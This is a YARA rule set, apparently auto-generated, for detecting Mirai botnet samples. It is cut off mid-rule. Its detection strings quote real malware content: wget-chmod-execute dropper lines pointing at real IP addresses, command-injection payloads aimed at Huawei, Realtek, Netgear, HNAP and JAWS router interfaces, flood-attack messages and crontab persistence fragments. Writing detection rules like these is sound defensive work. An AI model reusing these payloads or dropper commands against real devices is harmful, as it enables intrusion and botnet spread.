/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

rule Mirai_signature__ef96120a {
   meta:
      description = "_subset_batch - file Mirai(signature)_ef96120a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ef96120a8f968b6c5cddc26982a5e5149538e9019f58156408fdd972506c8d8f"
   strings:
      $s1 = "0/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__fad51e85 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fad51e85.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fad51e85f9b2c7e6a1d530861e7b4115e25d86f5cccd28c0da90c6a761fd29fd"
   strings:
      $s1 = "[tcpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s2 = "[udpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s3 = "[udpbypass_flood] socket() failed" fullword ascii /* score: '23.00'*/
      $s4 = "%s: '%s' is not an ELF executable for ARM" fullword ascii /* score: '17.50'*/
      $s5 = "R_ARM_PC24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s6 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s7 = "%s: '%s' library contains unsupported TLS" fullword ascii /* score: '12.50'*/
      $s8 = "[icmp_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s9 = "[udp_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s10 = "[icmp_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s11 = "[ack_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s12 = "[icmp_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s13 = "[udp_plain_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s14 = "[psh_ack_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s15 = "[udp_plain_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      8 of them
}

rule Mirai_signature__e186218c {
   meta:
      description = "_subset_batch - file Mirai(signature)_e186218c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e186218c4d962979b00e1453347eb96c2e25ca41d48bb452bedeb7e9676a3835"
   strings:
      $s1 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s4 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__e5e64105 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e5e64105.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e5e6410532c8f952adecedb2c0ff715a1a1dd33bf26966cec977fb5d1b14a40b"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s9 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__c4e36f4b {
   meta:
      description = "_subset_batch - file Mirai(signature)_c4e36f4b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c4e36f4b46d1b2908493c421af1b5b670411b49fe3dc15dedc8bcc8f272ded23"
   strings:
      $s1 = "pk[selfrep] found a faith - %d" fullword ascii /* score: '12.00'*/
      $s2 = "TryFromIntErrorsrc/floods/packet_build.rs" fullword ascii /* score: '12.00'*/
      $s3 = "\\a Display implementation returned an error unexpectedlyfalse0x0001020304050607080910111213141516171819202122232425262728293031" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c59b01f5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c59b01f5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c59b01f591434dbd56ef85f0b1fc9c1d412afae486a522f22308849fdac509f3"
   strings:
      $s1 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__f4c0d28e {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4c0d28e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f4c0d28e1618faea7fa5cce0a8a00459c14b1311e592a8c7e7dbbf41d5788c6a"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '47.00'*/
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $s3 = "ient>`cd /var; rm -rf nig; wget http://87.120.191.44/bins/Hilix.mips -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><N" ascii /* score: '27.00'*/
      $s4 = " -g 87.120.191.44 -l /tmp/binary -r /bins/Hilix.mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary huawei)</NewStatusURL><N" ascii /* score: '24.00'*/
      $s5 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" fullword ascii /* score: '20.00'*/
      $s6 = "POST /wanipcn.xml HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s7 = "POST /picdesc.xml HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s8 = "XXXXXXXXXXXXXX" fullword wide /* reversed goodware string 'XXXXXXXXXXXXXX' */ /* score: '16.50'*/
      $s9 = "XXXXXXXXXXXXXXXXXXXXXXX" fullword wide /* reversed goodware string 'XXXXXXXXXXXXXXXXXXXXXXX' */ /* score: '16.50'*/
      $s10 = "g/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemo" ascii /* score: '15.00'*/
      $s11 = "Host: 127.0.0.1:52869" fullword ascii /* score: '14.00'*/
      $s12 = "ewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></" ascii /* score: '13.00'*/
      $s13 = "XjXrX.XaXaX.XoX" fullword ascii /* score: '10.00'*/
      $s14 = "ewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s15 = "Content-Length: 630" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__b242cbd9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b242cbd9.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b242cbd9fea40a8f3969c4009abcdd4ef13dd52673ccd15e46380c16d3c02759"
   strings:
      $s1 = "wget http://109.205.213.5/kvariant.spc; chmod 777 kvariant.spc; ./kvariant.spc nuo.exploit;" fullword ascii /* score: '27.00'*/
      $s2 = "wget http://109.205.213.5/kvariant.ppc; chmod 777 kvariant.ppc; ./kvariant.ppc nuo.exploit;" fullword ascii /* score: '27.00'*/
      $s3 = "wget http://109.205.213.5/kvariant.arc; chmod 777 kvariant.arc; ./kvariant.arc nuo.exploit;" fullword ascii /* score: '27.00'*/
      $s4 = "wget http://109.205.213.5/kvariant.arm; chmod 777 kvariant.arm; ./kvariant.arm nuo.exploit;" fullword ascii /* score: '27.00'*/
      $s5 = "wget http://109.205.213.5/kvariant.sh4; chmod 777 kvariant.sh4; ./kvariant.sh4 nuo.exploit;" fullword ascii /* score: '24.00'*/
      $s6 = "wget http://109.205.213.5/kvariant.mips; chmod 777 kvariant.mips; ./kvariant.mips nuo.exploit;" fullword ascii /* score: '24.00'*/
      $s7 = "wget http://109.205.213.5/kvariant.x86; chmod 777 kvariant.x86; ./kvariant.x86 nuo.exploit;" fullword ascii /* score: '24.00'*/
      $s8 = "wget http://109.205.213.5/kvariant.mpsl; chmod 777 kvariant.mpsl; ./kvariant.mpsl nuo.exploit;" fullword ascii /* score: '24.00'*/
      $s9 = "wget http://109.205.213.5/kvariant.arm5; chmod 777 kvariant.arm5; ./kvariant.arm5 nuo.exploit;" fullword ascii /* score: '24.00'*/
      $s10 = "wget http://109.205.213.5/kvariant.arm6; chmod 777 kvariant.arm6; ./kvariant.arm6 nuo.exploit;" fullword ascii /* score: '24.00'*/
      $s11 = "wget http://109.205.213.5/kvariant.arm7; chmod 777 kvariant.arm7; ./kvariant.arm7 nuo.exploit;" fullword ascii /* score: '24.00'*/
      $s12 = "wget http://109.205.213.5/kvariant.m68k; chmod 777 kvariant.m68k; ./kvariant.m68k nuo.exploit;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 3KB and
      8 of them
}

rule Mirai_signature__d023fbac {
   meta:
      description = "_subset_batch - file Mirai(signature)_d023fbac.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d023fbac92a708cc2e9d723e6894b544e964ccfcf4acb4ae373c2d191be2d42f"
   strings:
      $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s2 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s3 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 telnet.sh; sh telnet.sh; " fullword ascii /* score: '25.00'*/
      $s4 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s5 = "HEAD / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s6 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s7 = "POST / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s8 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s9 = "Login:" fullword ascii /* score: '12.00'*/
      $s10 = "!shellcmd " fullword ascii /* score: '12.00'*/
      $s11 = "/command/" fullword ascii /* score: '12.00'*/
      $s12 = "login:" fullword ascii /* score: '12.00'*/
      $s13 = "/proc/%s/comm" fullword ascii /* score: '10.00'*/
      $s14 = "[0mAccess granted!" fullword ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      8 of them
}

rule Mirai_signature__d8b834c3 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d8b834c3.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d8b834c3fb76d737d527fa239baff9af37f0caff50d6bf16e31b771214f3fdd8"
   strings:
      $s1 = "X__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s2 = "vlbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__d1f33e8b {
   meta:
      description = "_subset_batch - file Mirai(signature)_d1f33e8b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d1f33e8b2d730bbdd0defc822005b8f1a4672c3fd5345fb8f8c5128b5ceb868c"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s9 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__cab75470 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cab75470.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cab75470536fef96f15e16e121dbc99234891275dbca978bad1900ef21da2a1a"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e0e30d76 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e0e30d76.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e0e30d76bdda0a72b4337883d76a3ceed6fa52cf24ecd8086e5726fe6b6a9d65"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
      $s2 = " 6!: 1<'}4668" fullword ascii /* score: '9.00'*/ /* hex encoded string 'aFh' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__b2d829c1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_b2d829c1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b2d829c10b6c9dc07c98983810c88a41fa281e736a84584cad51f8335c18ad5d"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s9 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__b7e04eed {
   meta:
      description = "_subset_batch - file Mirai(signature)_b7e04eed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b7e04eed45496be02840b14961c7bd47197cf8fc7bd9854f7c444c909a6e70c9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "killattk" fullword ascii /* score: '8.00'*/
      $s7 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s8 = "botkill" fullword ascii /* score: '8.00'*/
      $s9 = "/x78/xA3/x69/x6A/x20/x44/x61/x6E/x6B/x65/x73/x74/x20/x53/x34/xB4/x42/x03/x23/x07/x82/x05/x84/xA4/xD2/x04/xE2/x14/x64/xF2/x05/x32" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__d07294d0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d07294d0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d07294d0e1ce5ef1a2f68fb33404b8d321265770d782b071037ed22b6ae7c89c"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s9 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__d82f6e15 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d82f6e15.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d82f6e15208471a7e12f2d8ddd769eabb8c4c048d2d32426f5feef9b165b2015"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s9 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__de0ceb9a {
   meta:
      description = "_subset_batch - file Mirai(signature)_de0ceb9a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "de0ceb9af844bdfb74b6edfe0760a2626b6e878d854408b1602040039ca5f7fd"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s4 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s7 = "killattk" fullword ascii /* score: '8.00'*/
      $s8 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s9 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__e1d7f92c {
   meta:
      description = "_subset_batch - file Mirai(signature)_e1d7f92c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e1d7f92cfe1da7f5660e1de06f233092ed047883987246bbbe47535946f89b7c"
   strings:
      $s1 = "WantedBy=multi-user.target" fullword ascii /* score: '17.00'*/
      $s2 = "getchal" fullword ascii /* score: '13.00'*/
      $s3 = "/tmp/rc.local.tmp" fullword ascii /* score: '13.00'*/
      $s4 = "(crontab -l 2>/dev/null; echo \"" fullword ascii /* score: '12.00'*/
      $s5 = "\") | crontab - >/dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1" fullword ascii /* score: '9.00'*/
      $s7 = "systemctl start " fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/91.0.4472.120 Mobile Safari/537.36" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "systemctl enable " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__ee218a6a {
   meta:
      description = "_subset_batch - file Mirai(signature)_ee218a6a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee218a6a6e5a70f30b2f85843fa95bc28516825442880ee115ea479d947e73ae"
   strings:
      $s1 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__e0495375 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e0495375.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e049537520fcec0b6c40c84a8419a1c56d50541088d2baaacfb84fa3148b2964"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmls" ascii /* score: '44.50'*/
      $x2 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.50'*/
      $x3 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.50'*/
      $x4 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii /* score: '38.50'*/
      $x5 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://%s:%d/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi" ascii /* score: '38.50'*/
      $x6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"" ascii /* score: '37.50'*/
      $x7 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"htt" ascii /* score: '34.00'*/
      $x8 = "iption><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://%s:%d/Mo" ascii /* score: '33.50'*/
      $x9 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $x10 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s:%d/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/" ascii /* score: '33.50'*/
      $x11 = "ver1>`cd /tmp && rm -rf * && /bin/busybox wget http://%s:%d/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><" ascii /* score: '31.50'*/
      $x12 = "orks.com/HNAP1/\"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMapp" ascii /* score: '31.00'*/
      $x13 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii /* score: '30.50'*/
      $x14 = ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/va" ascii /* score: '30.50'*/
      $s15 = "GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s:%d/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" fullword ascii /* score: '29.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 900KB and
      1 of ($x*)
}

rule Mirai_signature__f568c9fe {
   meta:
      description = "_subset_batch - file Mirai(signature)_f568c9fe.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f568c9fe75a717deda540fed0cd39045d011eb621d4a906109b3ab07ad7f5370"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s5 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s6 = "killattk" fullword ascii /* score: '8.00'*/
      $s7 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s8 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__ccce15e5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ccce15e5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ccce15e522c19af4737f1e095d360f3d4410f1a8583ebb4b95700ff6338b974c"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__cbc60e62 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cbc60e62.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cbc60e6212812502af50462b0a6583f557679585ad8da3768e163eac1e2dcd72"
   strings:
      $s1 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
